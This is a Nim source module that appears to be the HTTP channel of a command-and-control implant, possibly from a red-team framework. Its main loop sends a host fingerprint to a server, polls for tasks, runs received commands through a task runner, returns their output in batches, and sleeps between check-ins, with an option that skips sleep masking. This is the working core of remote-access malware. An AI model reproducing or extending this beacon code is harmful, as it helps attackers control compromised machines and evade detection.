import ../utils/global
import ../utils/network/http as nhttp
import ../utils/tasks/utils as tasks
import ../utils/actions/fingerprint
import ../capabilities/sleep/core

proc returnOutput() =
  # Sends pending task output and clears the tasks that were sent
  if tasks.check_output():
    var batch = tasks.get_output()
    let sent = nhttp.sendBatch(batch)
    batch.setLen(0)
    tasks.clear_tasks(sent.ok, sent.body)

proc main*(): void =
  # Main loop of the http channel that checks in, runs tasks, and returns output
  sendFingerprint()
  while true:
    let boot = nhttp.sendRequest(hostTag)
    if boot.ok and boot.code == 200:
      break
    elif boot.code == 400 and isMissingHostResponse(boot.body):
      sendFingerprint()
    sleep_now()

  while true:
    returnOutput()
    sleep_now()
    var resp = nhttp.sendRequest(hostTag)
    if resp.code == 400 and isMissingHostResponse(resp.body):
      sendFingerprint()
    elif resp.ok and resp.body.len > 0:
      discard ensureReady()
      tasks.run_command(move(resp.body))
      returnOutput()
    if secondDelayEnabled:
      sleep_now(secondDelay, skipSleepMask = true)
      returnOutput()
